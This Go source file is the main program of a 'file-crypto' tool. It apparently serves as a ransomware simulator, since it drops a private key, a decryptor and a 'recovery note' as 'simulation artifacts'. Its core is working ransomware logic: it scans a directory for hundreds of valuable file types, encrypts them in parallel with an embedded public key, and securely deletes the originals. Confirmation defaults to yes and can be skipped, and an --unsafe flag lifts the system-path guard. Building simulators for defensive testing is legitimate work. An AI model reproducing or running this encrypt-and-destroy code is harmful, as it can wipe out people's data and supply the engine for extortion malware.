package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	doublestar "github.com/bmatcuk/doublestar/v4"

	"file-crypto/internal/crypto"
	"file-crypto/internal/fs"
	"file-crypto/internal/sim"
	"file-crypto/internal/system"
	"file-crypto/pkg/config"
)

var version = "dev"

type EncryptionStats struct {
	totalFiles      int64
	processedFiles  int64
	successfulFiles int64
	failedFiles     int64
	totalBytes      int64
}

func (s *EncryptionStats) incrementTotal() {
	atomic.AddInt64(&s.totalFiles, 1)
}

func (s *EncryptionStats) incrementProcessed() {
	atomic.AddInt64(&s.processedFiles, 1)
}

func (s *EncryptionStats) incrementSuccessful() {
	atomic.AddInt64(&s.successfulFiles, 1)
}

func (s *EncryptionStats) incrementFailed() {
	atomic.AddInt64(&s.failedFiles, 1)
}

func (s *EncryptionStats) addBytes(bytes int64) {
	atomic.AddInt64(&s.totalBytes, bytes)
}

func (s *EncryptionStats) getStats() (int64, int64, int64, int64, int64) {
	return atomic.LoadInt64(&s.totalFiles),
		atomic.LoadInt64(&s.processedFiles),
		atomic.LoadInt64(&s.successfulFiles),
		atomic.LoadInt64(&s.failedFiles),
		atomic.LoadInt64(&s.totalBytes)
}

// DataEncryptor abstracts the encryptor used by the CLI (symmetric or public-key based)
type DataEncryptor interface {
	EncryptData([]byte) ([]byte, error)
	SecureClear()
}

var allowedExtensions = map[string]struct{}{
	// Office Documents
	".doc":    {},
	".docx":   {},
	".xls":    {},
	".xlsx":   {},
	".xlsm":   {},
	".xlsb":   {},
	".ppt":    {},
	".pptx":   {},
	".pps":    {},
	".ppsx":   {},
	".potx":   {},
	".odt":    {},
	".ods":    {},
	".odp":    {},
	".rtf":    {},
	".csv":    {},
	".tsv":    {},
	".pdf":    {},
	".txt":    {},
	".md":     {},
	".tex":    {},
	".log":    {},
	".ini":    {},
	".yaml":   {},
	".yml":    {},
	".json":   {},
	".xml":    {},
	".conf":   {},
	".cfg":    {},
	".properties": {},
	".toml":   {},
	".env":    {},
	".lst":    {},
	".epub":   {}, // E-book
	".mobi":   {}, // E-book
	".azw":    {}, // E-book (Kindle)
	".azw3":   {}, // E-book (Kindle)
	".fb2":    {}, // E-book
	".xps":    {}, // Document format
	".oxps":   {}, // Document format
	".pages":  {}, // Apple Pages
	".numbers":{}, // Apple Numbers
	".key":    {}, // Apple Keynote (also used for private key, but Keynote is more common in docs)
	".gdoc":   {}, // Google Docs link file
	".gsheet": {}, // Google Sheets link file
	".gslides":{}, // Google Slides link file

	// Databases & Data Files
	".dat":    {},
	".db":     {},
	".sqlite": {},
	".sql":    {},
	".mdb":    {},
	".accdb":  {},
	".dbf":    {}, // ESRI Shapefile Attribute Data (also used for database files)
	".frm":    {}, // MySQL table format
	".ibd":    {}, // MySQL table data
	".myd":    {}, // MySQL data file
	".myi":    {}, // MySQL index file
	".mdf":    {}, // SQL Server primary data file
	".ndf":    {}, // SQL Server secondary data file
	".ldf":    {}, // SQL Server transaction log file
	".sdf":    {}, // SQL Server Compact Edition
	".jsonl":  {}, // JSON Lines
	".ndjson": {}, // Newline Delimited JSON
	".parquet":{}, // Columnar storage format
	".avro":   {}, // Data serialization system
	".orc":    {}, // Optimized Row Columnar
	".feather":{}, // Columnar data store for Python/R
	".arrow":  {}, // Apache Arrow data file
	".h5":     {}, // HDF5 data format
	".hdf5":   {}, // HDF5 data format

	// Archives & Compressed Files
	".tar":    {},
	".gz":     {},
	".tgz":    {},
	".bz2":    {},
	".tbz2":   {},
	".xz":     {},
	".zip":    {},
	".rar":    {},
	".7z":     {},
	".iso":    {},
	".img":    {},
	".zst":    {}, // Zstandard compressed file
	".lz":     {}, // Lempel-Ziv compressed file
	".lz4":    {}, // LZ4 compressed file
	".br":     {}, // Brotli compressed file
	".cab":    {}, // Windows Cabinet file
	".wim":    {}, // Windows Imaging Format
	".sit":    {}, // StuffIt archive
	".sitx":   {}, // StuffIt X archive
	".arj":    {}, // ARJ archive
	".lha":    {}, // LHA archive
	".lzh":    {}, // LZH archive
	".rpm":    {}, // Red Hat Package Manager
	".deb":    {}, // Debian package

	// Virtual Machine/Disk Images
	".vhd":    {}, // Virtual Hard Disk
	".vmdk":   {}, // VMware Virtual Disk
	".qcow2":  {}, // QEMU Copy On Write 2
	".ova":    {}, // Open Virtualization Appliance
	".vdi":    {}, // VirtualBox Disk Image
	".hdd":    {}, // Parallels Hard Disk
	".pvm":    {}, // Parallels Virtual Machine
	".vbox":   {}, // VirtualBox Machine settings
	".vmx":    {}, // VMware virtual machine configuration
	".ovf":    {}, // Open Virtualization Format

	// Executables/Libraries/Packages
	".apk":    {},
	".jar":    {},
	".war":    {},
	".ear":    {},
	".msi":    {},
	".pkg":    {},
	".appx":   {},
	".dmg":    {},
	".bin":    {},
	".exe":    {},
	".dll":    {},
	".so":     {},
	".o":      {},
	".a":      {},
	".lib":    {},
	".pdb":    {},
	".class":  {},
	".pyc":    {},
	".pyo":    {},
	".whl":    {},
	".egg":    {},
	".gem":    {}, // RubyGems package
	".msix":   {}, // Modern Windows application package
	".run":    {}, // Linux self-extracting executable
	".app":    {}, // macOS application bundle

	// Scripts & Markup
	".ps1":    {},
	".sh":     {},
	".bat":    {},
	".cmd":    {},
	".reg":    {},
	".pl":     {},
	".pm":     {},
	".rb":     {},
	".gemspec":{},
	".php":    {},
	".asp":    {},
	".aspx":   {},
	".jsp":    {},
	".py":     {},
	".js":     {},
	".ts":     {}, // TypeScript source file (distinct from video .ts)
	".jsx":    {},
	".tsx":    {},
	".coffee": {},
	".dart":   {},
	".swift":  {},
	".kt":     {},
	".kts":    {},
	".rs":     {},
	".m":      {}, // Objective-C, MATLAB script
	".mm":     {}, // Objective-C++
	".r":      {},
	".jl":     {}, // Julia
	".lua":    {},
	".groovy": {},
	".scala":  {},
	".clj":    {}, // Clojure
	".cljs":   {}, // ClojureScript
	".edn":    {}, // Extensible Data Notation (Clojure)
	".erl":    {}, // Erlang
	".hrl":    {}, // Erlang header
	".ex":     {}, // Elixir
	".exs":    {}, // Elixir script
	".elm":    {},
	".nim":    {},
	".zig":    {},
	".vala":   {},
	".asm":    {},
	".s":      {}, // Assembly
	".gohtml": {}, // Go HTML template
	".tpl":    {}, // Template file (various systems)
	".hbs":    {}, // Handlebars template
	".mustache":{}, // Mustache template
	".liquid": {}, // Liquid template (Shopify)
	".pug":    {}, // Pug template engine
	".haml":   {}, // Haml template
	".slim":   {}, // Slim template
	".jinja":  {}, // Jinja template (Python)
	".jade":   {}, // Jade template (deprecated Pug)

	// Source Code
	".c":      {},
	".cpp":    {},
	".h":      {},
	".hpp":    {},
	".cs":     {},
	".vb":     {}, // Visual Basic (legacy)
	".vbs":    {}, // Visual Basic Script (can be user-written)
	".go":     {},
	".fs":     {}, // F#
	".fsi":    {}, // F# interface
	".fsx":    {}, // F# script
	".d":      {}, // D language
	".pas":    {}, // Pascal
	".for":    {}, // Fortran
	".f":      {}, // Fortran
	".f90":    {}, // Fortran 90
	".ada":    {}, // Ada
	".adb":    {}, // Ada body
	".ads":    {}, // Ada specification
	".cob":    {}, // COBOL
	".cbl":    {}, // COBOL
	".bas":    {}, // BASIC
	".sv":     {}, // SystemVerilog
	".v":      {}, // Verilog
	".mod":    {}, // Go modules file (distinct from game mods or music modules)
	".pony":   {}, // Pony language
	".odin":   {}, // Odin language
	".factor": {}, // Factor language
	".idr":    {}, // Idris language
	".agda":   {}, // Agda language
	".lhs":    {}, // Literate Haskell

	// Web Files
	".html":   {},
	".htm":    {},
	".css":    {},
	".scss":   {},
	".less":   {},
	".vue":    {},
	".svelte": {},
	".jsonc":  {},
	".map":    {}, // Source map
	".webp":   {}, // WebP image format
	".woff":   {}, // Web Open Font Format
	".woff2":  {}, // Web Open Font Format 2
	".eot":    {}, // Embedded OpenType Font
	".svg":    {}, // Scalable Vector Graphics
	".webmanifest": {}, // Web app manifest
	".webapp": {}, // Open Web App Manifest
	".htc":    {}, // HTML Component (IE specific)
	".url":    {}, // Internet Shortcut (can be user-generated)
	".webloc": {}, // macOS Web Location
	".desktop":{}, // Linux desktop entry

	// Images
	".jpg":    {},
	".jpeg":   {},
	".png":    {},
	".gif":    {},
	".bmp":    {},
	".tiff":   {},
	".tif":    {},
	".ico":    {},
	".heic":   {},
	".raw":    {},
	".cr2":    {},
	".nef":    {},
	".orf":    {},
	".sr2":    {},
	".psd":    {},
	".ai":     {},
	".eps":    {},
	".indd":   {},
	".xd":     {}, // Adobe XD
	".sketch": {},
	".cdr":    {}, // CorelDRAW
	".svgz":   {}, // Compressed SVG
	".xmp":    {}, // Adobe Extensible Metadata Platform
	".dng":    {}, // Digital Negative (Adobe)
	".arw":    {}, // Sony RAW
	".rw2":    {}, // Panasonic RAW
	".raf":    {}, // Fujifilm RAW
	".3fr":    {}, // Hasselblad RAW
	".kc2":    {}, // Kodak RAW
	".mef":    {}, // Mamiya RAW
	".mos":    {}, // Leaf RAW
	".nrw":    {}, // Nikon RAW (older)
	".pef":    {}, // Pentax RAW
	".srf":    {}, // Sony RAW
	".srw":    {}, // Samsung RAW
	".tga":    {}, // Truevision Targa
	".cur":    {}, // Cursor file
	".jp2":    {}, // JPEG 2000
	".jpx":    {}, // JPEG 2000 Part 2
	".jpm":    {}, // JPEG 2000 Part 6
	".jpf":    {}, // JPEG 2000 Part 1
	".jxr":    {}, // JPEG XR
	".wdp":    {}, // Windows Media Photo (JPEG XR)
	".hdp":    {}, // HD Photo (JPEG XR)
	".hdr":    {}, // High Dynamic Range Image
	".exr":    {}, // OpenEXR High Dynamic Range Image
	".pcx":    {}, // Paintbrush Bitmap

	// Audio
	".mp3":    {},
	".wav":    {},
	".flac":   {},
	".aac":    {},
	".ogg":    {},
	".wma":    {},
	".m4a":    {},
	".aiff":   {},
	".alac":   {},
	".amr":    {},
	".mid":    {},
	".midi":   {},
	".opus":   {},
	".ra":     {},
	".au":     {},
	".voc":    {},
	".oga":    {}, // Ogg Audio
	".mka":    {}, // Matroska Audio
	".ac3":    {}, // Audio Codec 3
	".dts":    {}, // Digital Theater System
	".dsf":    {}, // DSD Audio File
	".ape":    {}, // Monkey's Audio Lossless
	".wv":     {}, // WavPack Lossless
	".cda":    {}, // CD Audio Track (often a pointer)
	".gp5":    {}, // Guitar Pro 5
	".gp4":    {}, // Guitar Pro 4
	".gpx":    {}, // Guitar Pro 6/7/8
	".sib":    {}, // Sibelius Score
	".mus":    {}, // Finale Score
	".ptb":    {}, // Power Tab Editor
	".smp":    {}, // Impulse Tracker Sample
	".it":     {}, // Impulse Tracker
	".xm":     {}, // Extended Module
	".s3m":    {}, // Scream Tracker 3

	// Video
	".mp4":    {},
	".avi":    {},
	".mov":    {}, // Apple QuickTime Movie
	".wmv":    {},
	".flv":    {},
	".mkv":    {},
	".webm":   {},
	".mpeg":   {},
	".mpg":    {},
	".3gp":    {},
	".3g2":    {},
	".mts":    {},
	".m2ts":   {},
	".vob":    {},
	".rm":     {},
	".rmvb":   {},
	".f4v":    {},
	".swf":    {},
	".m4v":    {},
	".ogv":    {},
	".yuv":    {},
	".divx":   {},
	".asf":    {},
	".mpe":    {},
	".mpv":    {},
	".m2v":    {},
	".qt":     {}, // Apple QuickTime Movie (legacy)
	".wtv":    {}, // Windows Recorded TV Show
	".dvr-ms": {}, // Microsoft Digital Video Recording
	".amv":    {}, // Anime Music Video
	".bik":    {}, // Bink Video
	".smk":    {}, // Smacker Video
	".camrec": {}, // Camtasia Recording
	".fbr":    {}, // FlashBack Recorder

	// Design/CAD/3D
	".dwg":    {},
	".dxf":    {},
	".skp":    {}, // SketchUp
	".stl":    {},
	".obj":    {},
	".fbx":    {}, // Filmbox 3D file
	".blend":  {}, // Blender
	".3ds":    {},
	".max":    {}, // 3ds Max
	".c4d":    {}, // Cinema 4D
	".lwo":    {}, // LightWave Object
	".lws":    {}, // LightWave Scene
	".ma":     {}, // Maya ASCII
	".mb":     {}, // Maya Binary
	".prt":    {}, // Pro/ENGINEER Part
	".sldprt": {}, // SolidWorks Part
	".sldasm": {}, // SolidWorks Assembly
	".step":   {},
	".stp":    {},
	".iges":   {},
	".igs":    {},
	".x_t":    {}, // Parasolid Text
	".x_b":    {}, // Parasolid Binary
	".gcode":  {}, // G-code (3D printing)
	".amf":    {}, // Additive Manufacturing File Format
	".3mf":    {}, // 3D Manufacturing Format
	".ztl":    {}, // ZBrush Tool
	".zpr":    {}, // ZBrush Project
	".spp":    {}, // Substance Painter Project
	".spsm":   {}, // Substance Painter Smart Material
	".sbsar":  {}, // Substance Archive

	// Fonts
	".ttf":    {}, // TrueType Font
	".otf":    {}, // OpenType Font
	".fon":    {}, // Generic font file
	".fnt":    {}, // Generic font file

	// GIS / Mapping
	".shp":    {}, // ESRI Shapefile
	".shx":    {}, // ESRI Shapefile Index
	".prj":    {}, // ESRI Projection file
	".geo.json":{}, // GeoJSON
	".topojson":{}, // TopoJSON
	".gdb":    {}, // ESRI File Geodatabase

	// Scientific / Data Analysis
	".mat":    {}, // MATLAB data file
	".nb":     {}, // Mathematica Notebook
	".cdf":    {}, // Common Data Format
	".nc":     {}, // NetCDF
	".sas7bdat":{}, // SAS data file
	".xpt":    {}, // SAS Transport file
	".dta":    {}, // Stata data file
	".sav":    {}, // SPSS data file
	".por":    {}, // SPSS Portable file
	".rdata":  {}, // R workspace data
	".rds":    {}, // R single object data
	".ipynb":  {}, // Jupyter Notebook
	".pyi":    {}, // Python type hint file
	".pkl":    {}, // Python pickle file
	".pickle": {}, // Python pickle file
	".npy":    {}, // NumPy array
	".npz":    {}, // NumPy compressed array

	// Game Development
	".unity":  {}, // Unity scene file
	".prefab": {}, // Unity prefab
	".asset":  {}, // Unity asset
	".uasset": {}, // Unreal Engine asset
	".umap":   {}, // Unreal Engine map
	".pak":    {}, // Game data archive (generic)
	".pak2":   {},
	".pak3":   {},
	".pak4":   {},
	".pak5":   {},
	".pak6":   {},
	".pak7":   {},
	".pak8":   {},
	".pak9":   {},
	".wad":    {}, // WAD (Doom, Half-Life)
	".pk3":    {}, // PK3 (Quake 3)
	".vpk":    {}, // Valve Pak
	".blk":    {}, // Generic block file
	".grp":    {}, // Group file

	// Miscellaneous
	".eml":    {}, // Email message
	".msg":    {}, // Outlook message
	".vcf":    {}, // vCard
	".ics":    {}, // iCalendar
	".torrent":{},
	".tmp":    {}, // Temporary file
	".swp":    {}, // Swap file (Vim)
	".lock":   {},
	".cache":  {},
	".fit":    {}, // Garmin FIT
	".tcx":    {}, // Garmin Training Center XML
	".sln":    {}, // Visual Studio Solution
	".csproj": {}, // C# Project
	".vbproj": {}, // VB.NET Project
	".xcodeproj": {}, // Xcode Project
	".xcworkspace": {}, // Xcode Workspace
	".sublime-project": {},
	".sublime-workspace": {},
	".vscode": {},
	".idea":   {}, // IntelliJ IDEA project directory
	".iml":    {}, // IntelliJ IDEA module file
	".editorconfig": {},
	".gitattributes": {},
	".gitignore": {},
	".dockerfile": {},
	".compose": {}, // Docker Compose
	".npmrc":   {},
	".yarnrc":  {},
	".babelrc": {},
	".eslintrc":{},
	".prettierrc": {},
	".stylelintrc": {},
	".mocharc.js": {},
	".mocharc.json": {},
	".mocharc.yaml": {},
	".mocharc.yml": {},
	".env.example": {},
	".env.local": {},
	".env.development": {},
	".env.production": {},
	".env.test": {},
	".gitmodules": {},
	".gitkeep": {},
	".npmignore": {},
	".dockerignore": {},
	".eslintignore": {},
	".prettierignore": {},
	".stylelintignore": {},
	".babelignore": {},
	".yarnclean": {},
	".yarn-integrity": {},
	".yarn-metadata.json": {},
	".yarn-error.log": {},
	".pnpmfile.cjs": {},
	".pnpmfile.js": {},
	".pnpm-debug.log": {},
	".browserslistrc": {}, // Browserslist configuration
	".htaccess": {}, // Apache HTTP Server access control
	".htpasswd": {}, // Apache HTTP Server password file
	".htgroup":  {}, // Apache HTTP Server group file
	".hgignore": {}, // Mercurial ignore file
	".cvsignore":{}, // CVS ignore file
	".procfile": {}, // Heroku Procfile
	".buildpacks":{}, // Heroku Buildpacks file
	".cfignore": {}, // Cloud Foundry ignore file
	".terraform":{}, // Terraform state directory
	".tfstate":  {}, // Terraform state file
	".lockb":    {}, // Lock file (binary)
	".pkpass":   {}, // Apple Wallet Pass
	".xar":      {}, // Apple XAR archive
	".pcap":     {}, // Packet capture (Wireshark)
	".cap":      {}, // Packet capture (generic)
	".dmp":      {}, // Memory dump
	".dump":     {}, // Generic dump file
	".bak":      {}, // Backup file
	".backup":   {}, // Generic backup file
	".old":      {}, // Old version of a file
	".orig":     {}, // Original version of a file
	".patch":    {}, // Patch file
	".diff":     {}, // Diff file
	".sig":      {}, // Signature file
	".asc":      {}, // ASCII armored signature or key
	".pem":      {}, // Privacy-Enhanced Mail (certificates)
	".crt":      {}, // Certificate
	".cer":      {}, // Certificate
	".p12":      {}, // PKCS #12 (certificates)
	".pfx":      {}, // PKCS #12 (certificates)
	".csr":      {}, // Certificate Signing Request
	".crl":      {}, // Certificate Revocation List
	".der":      {}, // Distinguished Encoding Rules (certificates)
}

func main() {
	cfg, err := config.ParseFlags("File Encryptor")
	if err != nil {
		log.Fatalf("❌ Configuration error: %v", err)
	}

	// Quick confirmation (default Yes) unless -y/--yes provided
	if !cfg.AssumeYes {
		if !confirmProceed("Proceed with ENCRYPTION (files will be destroyed)? [Y/n]: ") {
			fmt.Println("Aborted.")
			return
		}
	}

	cfg.PrintConfig("File Encryptor")

	// Create encryptor
	var enc DataEncryptor
	if crypto.HasEmbeddedPublicKey() {
		// Embedded public key mode: no key file needed
		encPub, err := crypto.NewPublicEncryptorFromEmbedded()
		if err != nil {
			log.Fatalf("❌ Failed to initialize embedded-key encryptor: %v", err)
		}
		enc = encPub
		fmt.Println("🔐 Using embedded public key (v5 hybrid mode)")

		// Force system exclusions for embedded-key builds (safety feature)
		if !cfg.SystemExclusions {
			cfg.SystemExclusions = true
			fmt.Println("🛡️  System file protection: ENABLED (mandatory for embedded-key builds)")
		}
	} else {
		// Load encryption key from file (legacy symmetric mode)
		keyData, err := loadKey(cfg.KeyFile)
		if err != nil {
			log.Fatalf("❌ Failed to load key: %v", err)
		}
		encryptor, err := crypto.NewEncryptor(keyData)
		if err != nil {
			log.Fatalf("❌ Failed to create encryptor: %v", err)
		}
		enc = encryptor
	}
	defer enc.SecureClear()

	// Create system exclusions handler
	exclusions := system.NewExclusions(cfg.SystemExclusions)

	// Safety check: prevent running on dangerous system directories (unless --unsafe)
	if err := checkTargetDirectorySafety(cfg, exclusions); err != nil {
		log.Fatalf("❌ Target directory safety check failed: %v", err)
	}

	// Find files to encrypt
	fmt.Println("\n🔍 Scanning for files to encrypt...")
	files, err := findFilesToEncrypt(cfg.TargetDir, exclusions, cfg)
	if err != nil {
		log.Fatalf("❌ Failed to find files: %v", err)
	}

	if len(files) == 0 {
		fmt.Println("ℹ️  No files found to encrypt.")
		return
	}

	fmt.Printf("📁 Found %d files to encrypt\n", len(files))

	if cfg.DryRun {
		var totalBytes int64
		for _, f := range files {
			if sz, err := fs.GetFileSize(f); err == nil {
				totalBytes += sz
			}
		}
		fmt.Printf("\n[DRY-RUN] Would process %d files (%.2f MB)\n", len(files), float64(totalBytes)/(1024*1024))
		return
	}

	// Initialize statistics
	stats := &EncryptionStats{}
	for range files {
		stats.incrementTotal()
	}

	// Start benchmark timer
	startTime := time.Now()

	// Process files
	fmt.Printf("\n🚀 Starting encryption with %d workers...\n", cfg.MaxWorkers)
	processFiles(files, enc, stats, cfg)

	// Calculate final statistics
	endTime := time.Now()
	duration := endTime.Sub(startTime)

	// Print final statistics
	printFinalStats(stats, cfg.Benchmark, duration)

	// Drop simulation artifacts when enabled
	if result, err := sim.DropArtifacts(cfg); err != nil {
		fmt.Printf("⚠️  Failed to write simulation artifacts: %v\n", err)
	} else if result != nil {
		fmt.Printf("\n🗂️  Simulation artifacts saved to %s\n", result.Directory)
		if result.PrivateKeyPath != "" {
			fmt.Printf("   • Private key: %s\n", result.PrivateKeyPath)
		}
		if result.DecryptorPath != "" {
			fmt.Printf("   • Decryptor: %s\n", result.DecryptorPath)
		}
		if result.NotePath != "" {
			fmt.Printf("   • Recovery note: %s\n", result.NotePath)
		}
	}
}

func loadKey(keyFile string) ([]byte, error) {
	if _, err := os.Stat(keyFile); os.IsNotExist(err) {
		return nil, fmt.Errorf("key file '%s' not found", keyFile)
	}

	keyData, err := os.ReadFile(keyFile)
	if err != nil {
		return nil, fmt.Errorf("failed to read key file: %w", err)
	}

	// Remove any trailing whitespace/newlines
	return []byte(strings.TrimSpace(string(keyData))), nil
}

func findFilesToEncrypt(targetDir string, exclusions *system.Exclusions, cfg *config.Config) ([]string, error) {
	includeGlobs := parseGlobList(cfg.IncludeGlobs)
	excludeGlobs := parseGlobList(cfg.ExcludeGlobs)
	minSize := cfg.MinSizeBytes
	maxSize := cfg.MaxSizeBytes
	return fs.FindFiles(targetDir, func(path string, info os.FileInfo) bool {
		// Skip if already encrypted
		if fs.IsEncryptedFile(path) {
			return false
		}

		// Skip if should be excluded
		if exclusions.ShouldSkip(path) {
			return false
		}

		// Size filters
		if minSize > 0 && info.Size() < minSize {
			return false
		}
		if maxSize > 0 && info.Size() > maxSize {
			return false
		}

		// Glob filters
		if len(includeGlobs) > 0 && !matchAnyGlob(path, includeGlobs) {
			return false
		}
		if len(excludeGlobs) > 0 && matchAnyGlob(path, excludeGlobs) {
			return false
		}

		// Only encrypt files with allowed extensions (default allowlist)
		ext := strings.ToLower(filepath.Ext(path))
		if ext == "" || !isAllowedExtension(ext) {
			return false
		}

		return true
	})
}

func checkTargetDirectorySafety(cfg *config.Config, exclusions *system.Exclusions) error {
	if cfg.UnsafeMode {
		fmt.Println("⚠️  UNSAFE mode enabled: system directory guard rails disabled")
		return nil
	}

	absPath, err := filepath.Abs(cfg.TargetDir)
	if err != nil {
		return fmt.Errorf("resolve target directory: %w", err)
	}

	if isCriticalSystemPath(absPath) {
		return fmt.Errorf("refusing to operate on critical system path %s (use --unsafe to override)", absPath)
	}

	if exclusions != nil && exclusions.ShouldSkip(absPath) {
		return fmt.Errorf("target directory %s is protected by system exclusions", absPath)
	}

	return nil
}

func isCriticalSystemPath(path string) bool {
	critical := []string{
		"/", "/etc", "/bin", "/sbin", "/usr", "/System", "/Library", "/Applications",
		"/home", "/Users", "/var", "/opt", "/private", "/root",
	}
	winCritical := []string{
		"C:/", "C:/Windows", "C:/Program Files", "C:/Program Files (x86)", "C:/ProgramData",
	}

	clean := filepath.ToSlash(filepath.Clean(path))
	for _, guard := range critical {
		if strings.EqualFold(clean, guard) {
			return true
		}
	}
	if len(clean) == 3 && clean[1] == ':' && clean[2] == '/' {
		return true // drive root like C:/
	}
	for _, guard := range winCritical {
		if strings.EqualFold(clean, guard) {
			return true
		}
	}
	return false
}

func isAllowedExtension(ext string) bool {
	_, ok := allowedExtensions[ext]
	return ok
}

func processFiles(files []string, enc DataEncryptor, stats *EncryptionStats, cfg *config.Config) {
	var wg sync.WaitGroup
	fileChan := make(chan string, len(files))

	// Start worker goroutines
	for i := 0; i < cfg.MaxWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for filePath := range fileChan {
				processFile(filePath, enc, stats, cfg)
			}
		}()
	}

	// Send files to workers
	for _, filePath := range files {
		fileChan <- filePath
	}
	close(fileChan)

	// Wait for all workers to complete
	wg.Wait()
}

func processFile(filePath string, enc DataEncryptor, stats *EncryptionStats, cfg *config.Config) {
	stats.incrementProcessed()

	// Read file
	data, err := os.ReadFile(filePath)
	if err != nil {
		if cfg.Verbose {
			fmt.Printf("❌ [Failed] %s: %v\n", filepath.Base(filePath), err)
		}
		stats.incrementFailed()
		return
	}

	// Compress if enabled
	originalSize := len(data)
	if cfg.EnableCompression {
		compressedData, err := crypto.CompressData(data)
		if err != nil {
			if cfg.Verbose {
				fmt.Printf("❌ [Failed] %s: compression failed: %v\n", filepath.Base(filePath), err)
			}
			stats.incrementFailed()
			return
		}

		compressionRatio := float64(len(compressedData)) / float64(originalSize) * 100
		if cfg.Verbose {
			fmt.Printf("📦 Compressed %s: %d -> %d bytes (%.1f%%)\n",
				filepath.Base(filePath), originalSize, len(compressedData), compressionRatio)
		}
		data = compressedData
	}

	// Encrypt
	encryptedData, err := enc.EncryptData(data)
	if err != nil {
		if cfg.Verbose {
			fmt.Printf("❌ [Failed] %s: encryption failed: %v\n", filepath.Base(filePath), err)
		}
		stats.incrementFailed()
		return
	}

	// Write encrypted file
	encryptedPath := filePath + ".encrypted"
	err = os.WriteFile(encryptedPath, encryptedData, 0644)
	if err != nil {
		if cfg.Verbose {
			fmt.Printf("❌ [Failed] %s: write failed: %v\n", filepath.Base(filePath), err)
		}
		stats.incrementFailed()
		return
	}

	// Secure delete original file
	secureOps := fs.NewSecureFileOperations(64 * 1024) // 64KB buffer
	if err := secureOps.SecureDelete(filePath); err != nil {
		if cfg.Verbose {
			fmt.Printf("⚠️  [Warning] %s: secure deletion failed: %v\n", filepath.Base(filePath), err)
		}
	}

	// Update statistics
	stats.addBytes(int64(originalSize))
	stats.incrementSuccessful()

	if cfg.Verbose {
		_, processedFiles, successfulFiles, _, _ := stats.getStats()
		fmt.Printf("✅ [%d/%d] %s -> %s\n",
			successfulFiles-1, processedFiles, filepath.Base(filePath), filepath.Base(encryptedPath))
	}
}

func printFinalStats(stats *EncryptionStats, benchmark bool, duration time.Duration) {
	_, _, successfulFiles, failedFiles, totalBytes := stats.getStats()

	fmt.Printf("\n📊 Encryption Complete!\n")
	fmt.Printf("   ✅ Successful: %d\n", successfulFiles)
	fmt.Printf("   ❌ Failed: %d\n", failedFiles)

	if benchmark && successfulFiles > 0 {
		if duration > 0 {
			filesPerSec := float64(successfulFiles) / duration.Seconds()
			fmt.Printf("   ⏱️  Time: %.2f seconds\n", duration.Seconds())
			fmt.Printf("   📈 Rate: %.1f files/sec\n", filesPerSec)

			if totalBytes > 0 {
				bytesPerSec := float64(totalBytes) / duration.Seconds()
				fmt.Printf("   💾 Throughput: %s\n", formatRate(bytesPerSec))
			}
		}
	}
}

func parseGlobList(csv string) []string {
	var res []string
	for _, p := range strings.Split(csv, ",") {
		p = strings.TrimSpace(p)
		if p != "" {
			res = append(res, p)
		}
	}
	return res
}

func matchAnyGlob(path string, patterns []string) bool {
	unix := strings.ReplaceAll(path, "\\", "/")
	for _, pat := range patterns {
		pat = strings.ReplaceAll(pat, "\\", "/")
		// doublestar supports ** so policy globs can match nested directories.
		if ok, err := doublestar.Match(pat, unix); err == nil && ok {
			return true
		}
	}
	return false
}

func formatRate(bytesPerSec float64) string {
	const (
		KB = 1024
		MB = KB * 1024
		GB = MB * 1024
	)

	switch {
	case bytesPerSec >= GB:
		return fmt.Sprintf("%.1f GB/s", bytesPerSec/GB)
	case bytesPerSec >= MB:
		return fmt.Sprintf("%.1f MB/s", bytesPerSec/MB)
	case bytesPerSec >= KB:
		return fmt.Sprintf("%.1f KB/s", bytesPerSec/KB)
	default:
		return fmt.Sprintf("%.1f B/s", bytesPerSec)
	}
}

func confirmProceed(prompt string) bool {
	fmt.Print(prompt)
	r := bufio.NewReader(os.Stdin)
	line, _ := r.ReadString('\n')
	s := strings.TrimSpace(strings.ToLower(line))
	if s == "" {
		return true
	}
	return s == "y" || s == "yes"
}
